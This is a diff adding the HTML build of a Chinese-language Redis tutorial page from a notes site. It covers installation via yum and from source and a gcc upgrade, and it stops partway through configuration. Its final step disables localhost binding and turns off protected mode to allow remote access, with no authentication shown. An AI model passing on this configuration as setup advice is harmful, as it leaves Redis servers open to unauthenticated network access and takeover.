@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Redis | awesome-notes</title>
+    <meta name="generator" content="VuePress 1.8.0">
+    <script src="https://cdn.jsdelivr.net/npm/react/umd/react.production.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/react-dom/umd/react-dom.production.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/zrender@4.3.0/dist/zrender.js"></script>
+    <script src="https://d3js.org/d3.v5.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.116.1/build/three.js"></script>
+    <link rel="icon" href="/logo.png">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="apple-touch-icon" href="/icons/apple-touch-icon-152x152.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#3eaf7c">
+    <meta name="description" content="笔记">
+    <meta name="theme-color" content="#3eaf7c">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="msapplication-TileImage" content="/icons/msapplication-icon-144x144.png">
+    <meta name="msapplication-TileColor" content="#000000">
+    
+    <link rel="preload" href="/assets/css/0.styles.796597b9.css" as="style"><link rel="preload" href="/assets/js/app.2630ad2b.js" as="script"><link rel="preload" href="/assets/js/2.ba37855e.js" as="script"><link rel="preload" href="/assets/js/16.0db907f7.js" as="script"><link rel="preload" href="/assets/js/5.65b8a4d7.js" as="script"><link rel="prefetch" href="/assets/js/10.bf21da98.js"><link rel="prefetch" href="/assets/js/11.47c17e33.js"><link rel="prefetch" href="/assets/js/12.52366a61.js"><link rel="prefetch" href="/assets/js/13.f3d2ea36.js"><link rel="prefetch" href="/assets/js/14.26ad3fbd.js"><link rel="prefetch" href="/assets/js/15.330cca97.js"><link rel="prefetch" href="/assets/js/17.f4312399.js"><link rel="prefetch" href="/assets/js/18.0078fa2e.js"><link rel="prefetch" href="/assets/js/19.0567fee3.js"><link rel="prefetch" href="/assets/js/20.cf94cc4d.js"><link rel="prefetch" href="/assets/js/21.5c974e0c.js"><link rel="prefetch" href="/assets/js/22.278aa096.js"><link rel="prefetch" href="/assets/js/23.4d43f959.js"><link rel="prefetch" href="/assets/js/24.011de924.js"><link rel="prefetch" href="/assets/js/25.11cd2df3.js"><link rel="prefetch" href="/assets/js/26.6a2760d5.js"><link rel="prefetch" href="/assets/js/27.04bd79eb.js"><link rel="prefetch" href="/assets/js/28.26a8e435.js"><link rel="prefetch" href="/assets/js/29.3fdb3ba8.js"><link rel="prefetch" href="/assets/js/3.2c6cfde3.js"><link rel="prefetch" href="/assets/js/30.e0b71ea8.js"><link rel="prefetch" href="/assets/js/31.3f54ff18.js"><link rel="prefetch" href="/assets/js/32.952dcf3b.js"><link rel="prefetch" href="/assets/js/33.0bda2b2a.js"><link rel="prefetch" href="/assets/js/34.b243bae4.js"><link rel="prefetch" href="/assets/js/35.90ef5354.js"><link rel="prefetch" href="/assets/js/36.c4af5d28.js"><link rel="prefetch" href="/assets/js/37.16931636.js"><link rel="prefetch" href="/assets/js/38.02bc5086.js"><link rel="prefetch" href="/assets/js/39.94e1fa29.js"><link rel="prefetch" href="/assets/js/4.869e2716.js"><link rel="prefetch" href="/assets/js/40.393a2a14.js"><link rel="prefetch" href="/assets/js/41.aec51b9a.js"><link rel="prefetch" href="/assets/js/42.5c15d0e0.js"><link rel="prefetch" href="/assets/js/43.b9e69cde.js"><link rel="prefetch" href="/assets/js/44.a7c21d22.js"><link rel="prefetch" href="/assets/js/45.dba35b69.js"><link rel="prefetch" href="/assets/js/46.1110c8f6.js"><link rel="prefetch" href="/assets/js/47.68311e50.js"><link rel="prefetch" href="/assets/js/6.b6b55724.js"><link rel="prefetch" href="/assets/js/7.40520de0.js"><link rel="prefetch" href="/assets/js/8.448f622f.js"><link rel="prefetch" href="/assets/js/9.a182596b.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.796597b9.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">awesome-notes</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
+  主页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="基础" class="dropdown-title"><span class="title">基础</span> <span class="arrow down"></span></button> <button type="button" aria-label="基础" class="mobile-dropdown-title"><span class="title">基础</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/basis/algorithm/" class="nav-link">
+  数据结构与算法
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="前端" class="dropdown-title"><span class="title">前端</span> <span class="arrow down"></span></button> <button type="button" aria-label="前端" class="mobile-dropdown-title"><span class="title">前端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          基础
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/fontend/basis/CSS/" class="nav-link">
+  CSS
+</a></li><li class="dropdown-subitem"><a href="/fontend/basis/JavaScript/" class="nav-link">
+  JavaScript
+</a></li><li class="dropdown-subitem"><a href="/fontend/basis/TypeScript/" class="nav-link">
+  TypeScript
+</a></li></ul></li><li class="dropdown-item"><h4>
+          
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/fontend/note/" class="nav-link">
+  笔记
+</a></li></ul></li><li class="dropdown-item"><h4>
+          框架
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/fontend/frame/vue/" class="nav-link">
+  Vue
+</a></li><li class="dropdown-subitem"><a href="/fontend/frame/React/" class="nav-link">
+  React
+</a></li></ul></li><li class="dropdown-item"><h4>
+          
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/fontend/data-visualization/" class="nav-link">
+  数据可视化
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="后端" class="dropdown-title"><span class="title">后端</span> <span class="arrow down"></span></button> <button type="button" aria-label="后端" class="mobile-dropdown-title"><span class="title">后端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          基础
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/backend/basis/Go/" class="nav-link">
+  Go
+</a></li><li class="dropdown-subitem"><a href="/backend/basis/PHP/" class="nav-link">
+  PHP
+</a></li><li class="dropdown-subitem"><a href="/backend/basis/Java/" class="nav-link">
+  Java
+</a></li><li class="dropdown-subitem"><a href="/backend/basis/Node/" class="nav-link">
+  Node
+</a></li><li class="dropdown-subitem"><a href="/backend/basis/Python/" class="nav-link">
+  Python
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/backend/database/MySQL/" class="nav-link">
+  MySQL
+</a></li><li class="dropdown-subitem"><a href="/backend/database/Redis/" aria-current="page" class="nav-link router-link-exact-active router-link-active">
+  Redis
+</a></li><li class="dropdown-subitem"><a href="/backend/database/MongoDB/" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/backend/middleware/RabbitMQ/" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/backend/middleware/HAProxy/" class="nav-link">
+  HAProxy 
+</a></li><li class="dropdown-subitem"><a href="/backend/middleware/Nginx/" class="nav-link">
+  Nginx
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="工具" class="dropdown-title"><span class="title">工具</span> <span class="arrow down"></span></button> <button type="button" aria-label="工具" class="mobile-dropdown-title"><span class="title">工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/tool/Git/" class="nav-link">
+  Git
+</a></li><li class="dropdown-item"><!----> <a href="/tool/Docker/" class="nav-link">
+  Docker
+</a></li><li class="dropdown-item"><!----> <a href="/tool/Jenkins/" class="nav-link">
+  Jenkins
+</a></li><li class="dropdown-item"><!----> <a href="/tool/Regular_Expression/" class="nav-link">
+  正则表达式
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="系统" class="dropdown-title"><span class="title">系统</span> <span class="arrow down"></span></button> <button type="button" aria-label="系统" class="mobile-dropdown-title"><span class="title">系统</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/system/CentOS/" class="nav-link">
+  CentOS
+</a></li><li class="dropdown-item"><!----> <a href="/system/Ubuntu/" class="nav-link">
+  Ubuntu
+</a></li></ul></div></div><div class="nav-item"><a href="/repository/" class="nav-link">
+  库
+</a></div><div class="nav-item"><a href="/note/" class="nav-link">
+  零星笔记
+</a></div> <a href="https://github.com/lalifeier/awesome-notes" target="_blank" rel="noopener noreferrer" class="repo-link">
+    Github
+    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
+  主页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="基础" class="dropdown-title"><span class="title">基础</span> <span class="arrow down"></span></button> <button type="button" aria-label="基础" class="mobile-dropdown-title"><span class="title">基础</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/basis/algorithm/" class="nav-link">
+  数据结构与算法
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="前端" class="dropdown-title"><span class="title">前端</span> <span class="arrow down"></span></button> <button type="button" aria-label="前端" class="mobile-dropdown-title"><span class="title">前端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          基础
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/fontend/basis/CSS/" class="nav-link">
+  CSS
+</a></li><li class="dropdown-subitem"><a href="/fontend/basis/JavaScript/" class="nav-link">
+  JavaScript
+</a></li><li class="dropdown-subitem"><a href="/fontend/basis/TypeScript/" class="nav-link">
+  TypeScript
+</a></li></ul></li><li class="dropdown-item"><h4>
+          
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/fontend/note/" class="nav-link">
+  笔记
+</a></li></ul></li><li class="dropdown-item"><h4>
+          框架
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/fontend/frame/vue/" class="nav-link">
+  Vue
+</a></li><li class="dropdown-subitem"><a href="/fontend/frame/React/" class="nav-link">
+  React
+</a></li></ul></li><li class="dropdown-item"><h4>
+          
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/fontend/data-visualization/" class="nav-link">
+  数据可视化
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="后端" class="dropdown-title"><span class="title">后端</span> <span class="arrow down"></span></button> <button type="button" aria-label="后端" class="mobile-dropdown-title"><span class="title">后端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          基础
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/backend/basis/Go/" class="nav-link">
+  Go
+</a></li><li class="dropdown-subitem"><a href="/backend/basis/PHP/" class="nav-link">
+  PHP
+</a></li><li class="dropdown-subitem"><a href="/backend/basis/Java/" class="nav-link">
+  Java
+</a></li><li class="dropdown-subitem"><a href="/backend/basis/Node/" class="nav-link">
+  Node
+</a></li><li class="dropdown-subitem"><a href="/backend/basis/Python/" class="nav-link">
+  Python
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/backend/database/MySQL/" class="nav-link">
+  MySQL
+</a></li><li class="dropdown-subitem"><a href="/backend/database/Redis/" aria-current="page" class="nav-link router-link-exact-active router-link-active">
+  Redis
+</a></li><li class="dropdown-subitem"><a href="/backend/database/MongoDB/" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/backend/middleware/RabbitMQ/" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/backend/middleware/HAProxy/" class="nav-link">
+  HAProxy 
+</a></li><li class="dropdown-subitem"><a href="/backend/middleware/Nginx/" class="nav-link">
+  Nginx
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="工具" class="dropdown-title"><span class="title">工具</span> <span class="arrow down"></span></button> <button type="button" aria-label="工具" class="mobile-dropdown-title"><span class="title">工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/tool/Git/" class="nav-link">
+  Git
+</a></li><li class="dropdown-item"><!----> <a href="/tool/Docker/" class="nav-link">
+  Docker
+</a></li><li class="dropdown-item"><!----> <a href="/tool/Jenkins/" class="nav-link">
+  Jenkins
+</a></li><li class="dropdown-item"><!----> <a href="/tool/Regular_Expression/" class="nav-link">
+  正则表达式
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="系统" class="dropdown-title"><span class="title">系统</span> <span class="arrow down"></span></button> <button type="button" aria-label="系统" class="mobile-dropdown-title"><span class="title">系统</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/system/CentOS/" class="nav-link">
+  CentOS
+</a></li><li class="dropdown-item"><!----> <a href="/system/Ubuntu/" class="nav-link">
+  Ubuntu
+</a></li></ul></div></div><div class="nav-item"><a href="/repository/" class="nav-link">
+  库
+</a></div><div class="nav-item"><a href="/note/" class="nav-link">
+  零星笔记
+</a></div> <a href="https://github.com/lalifeier/awesome-notes" target="_blank" rel="noopener noreferrer" class="repo-link">
+    Github
+    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>Redis</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/backend/database/Redis/#开发环境" class="sidebar-link">开发环境</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#centos-epel-仓库安装" class="sidebar-link">Centos EPEL 仓库安装</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#源码安装" class="sidebar-link">源码安装</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#redis-配置" class="sidebar-link">Redis 配置</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#redis-开机启动" class="sidebar-link">Redis 开机启动</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#docker-安装-redis" class="sidebar-link">Docker 安装 Redis</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#可视化工具" class="sidebar-link">可视化工具</a></li></ul></li><li><a href="/backend/database/Redis/#使用" class="sidebar-link">使用</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#通用命令" class="sidebar-link">通用命令</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#字符串" class="sidebar-link">字符串</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#哈希" class="sidebar-link">哈希</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#列表" class="sidebar-link">列表</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#集合" class="sidebar-link">集合</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#有序集合" class="sidebar-link">有序集合</a></li></ul></li><li><a href="/backend/database/Redis/#客户端" class="sidebar-link">客户端</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#jedis" class="sidebar-link">Jedis</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#redis-py" class="sidebar-link">redis-py</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#redigo" class="sidebar-link">redigo</a></li></ul></li><li><a href="/backend/database/Redis/#应用" class="sidebar-link">应用</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#慢查询" class="sidebar-link">慢查询</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#pipeline" class="sidebar-link">pipeline</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#发布订阅" class="sidebar-link">发布订阅</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#bitmap" class="sidebar-link">bitmap</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#hyperloglog" class="sidebar-link">hyperloglog</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#geo" class="sidebar-link">geo</a></li></ul></li><li><a href="/backend/database/Redis/#持久化" class="sidebar-link">持久化</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#rdb" class="sidebar-link">RDB</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#aof" class="sidebar-link">AOF</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#rdb-和-aof-选择" class="sidebar-link">RDB 和 AOF 选择</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#常见问题" class="sidebar-link">常见问题</a></li></ul></li><li><a href="/backend/database/Redis/#主从复制" class="sidebar-link">主从复制</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#主从复制配置" class="sidebar-link">主从复制配置</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#全量复制开销" class="sidebar-link">全量复制开销</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#常见问题-2" class="sidebar-link">常见问题</a></li></ul></li><li><a href="/backend/database/Redis/#redis-sentinel" class="sidebar-link">Redis Sentinel</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#redis-sentinel-故障转移" class="sidebar-link">Redis Sentinel 故障转移</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#安装与配置" class="sidebar-link">安装与配置</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#故障转移" class="sidebar-link">故障转移</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#常见问题-3" class="sidebar-link">常见问题</a></li></ul></li><li><a href="/backend/database/Redis/#redis-cluster" class="sidebar-link">Redis Cluster</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#集群" class="sidebar-link">集群</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#数据分布" class="sidebar-link">数据分布</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#安装" class="sidebar-link">安装</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#扩容集群" class="sidebar-link">扩容集群</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#收缩集群" class="sidebar-link">收缩集群</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#客户端路由" class="sidebar-link">客户端路由</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#故障" class="sidebar-link">故障</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#常见问题-4" class="sidebar-link">常见问题</a></li></ul></li><li><a href="/backend/database/Redis/#缓存" class="sidebar-link">缓存</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#好处和成本" class="sidebar-link">好处和成本</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#更新策略" class="sidebar-link">更新策略</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#缓存粒度" class="sidebar-link">缓存粒度</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#缓存穿透" class="sidebar-link">缓存穿透</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#缓存雪崩" class="sidebar-link">缓存雪崩</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#无底洞问题" class="sidebar-link">无底洞问题</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#热点-key-的重建优化" class="sidebar-link">热点 key 的重建优化</a></li></ul></li><li><a href="/backend/database/Redis/#cachecloud" class="sidebar-link">CacheCloud</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#安装-2" class="sidebar-link">安装</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#配置-4" class="sidebar-link">配置</a></li></ul></li><li><a href="/backend/database/Redis/#布隆过滤器" class="sidebar-link">布隆过滤器</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#误差率" class="sidebar-link">误差率</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#本地布隆过滤器" class="sidebar-link">本地布隆过滤器</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#redis-布隆过滤器" class="sidebar-link">Redis 布隆过滤器</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#redis-分布式布隆过滤器" class="sidebar-link">Redis 分布式布隆过滤器</a></li></ul></li><li><a href="/backend/database/Redis/#开发规范" class="sidebar-link">开发规范</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#键值设计" class="sidebar-link">键值设计</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#键值生命周期" class="sidebar-link">键值生命周期</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#命令优化" class="sidebar-link">命令优化</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#客户端优化" class="sidebar-link">客户端优化</a></li></ul></li><li><a href="/backend/database/Redis/#开发运维" class="sidebar-link">开发运维</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/backend/database/Redis/#linux-内核优化" class="sidebar-link">Linux 内核优化</a></li><li class="sidebar-sub-header"><a href="/backend/database/Redis/#安全" class="sidebar-link">安全</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="redis"><a href="#redis" class="header-anchor">#</a> Redis</h1> <h4 id="redis-2"><a href="#redis-2" class="header-anchor">#</a> Redis</h4> <h2 id="开发环境"><a href="#开发环境" class="header-anchor">#</a> 开发环境</h2> <h3 id="centos-epel-仓库安装"><a href="#centos-epel-仓库安装" class="header-anchor">#</a> Centos EPEL 仓库安装</h3> <ul><li>安装 redis</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>yum <span class="token function">install</span> epel-release
+yum update
+yum <span class="token function">install</span> redis
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>启动</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>systemctl start redis
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="源码安装"><a href="#源码安装" class="header-anchor">#</a> 源码安装</h3> <ul><li>安装基础依赖</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>yum <span class="token function">install</span> gcc
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>下载安装包</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">wget</span> http://download.redis.io/releases/redis-5.0.7.tar.gz
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>解压到指定目录</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>tar xzf redis-5.0.7.tar.gz
+mv ./redis-5.0.7 /usr/local/redis
+cd /usr/local/redis/
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>编译</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">make</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>出现报错 zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory</p></div> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">make</span> <span class="token assign-left variable">MALLOC</span><span class="token operator">=</span>libc
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>make[1]: *** [server.o] Error 1</p> <p>make[1]: Leaving directory `/usr/local/redis/src'</p> <p>make: _** [all] Error 2</p></div> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment"># 查看gcc版本是否在5.3以上，centos7.6默认安装4.8.5</span>
+gcc -v
+<span class="token comment"># 升级gcc到5.3及以上</span>
+yum -y <span class="token function">install</span> centos-release-scl
+yum -y <span class="token function">install</span> devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils
+scl <span class="token builtin class-name">enable</span> devtoolset-9 <span class="token function">bash</span>
+<span class="token comment">#需要注意的是scl命令启用只是临时的，退出shell或重启就会恢复原系统gcc版本。</span>
+<span class="token comment">#如果要长期使用gcc 9.3的话</span>
+<span class="token builtin class-name">echo</span> <span class="token string">&quot;source /opt/rh/devtoolset-9/enable&quot;</span> <span class="token operator">&gt;&gt;</span>/etc/profile
+<span class="token comment">#这样退出shell重新打开就是新版的gcc了</span>
+<span class="token comment">#以下其他版本同理，修改devtoolset版本号即可</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><ul><li>安装</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">make</span> <span class="token function">install</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>安装完成</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token builtin class-name">cd</span> /usr/local/bin/
+<span class="token function">ls</span> -all
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>配置⽂件，移动到/etc/⽬录下</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>mkdir /etc/redis
+cp /usr/local/redis/redis.conf /etc/redis/
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="redis-配置"><a href="#redis-配置" class="header-anchor">#</a> Redis 配置</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>vim /etc/redis/redis.conf
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>允许远程访问</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>bind 127.0.0.1
+修改为
+#bind 127.0.0.1
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>关闭保护功能</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code># protected-mode yes
+修改为
+protected-mode no
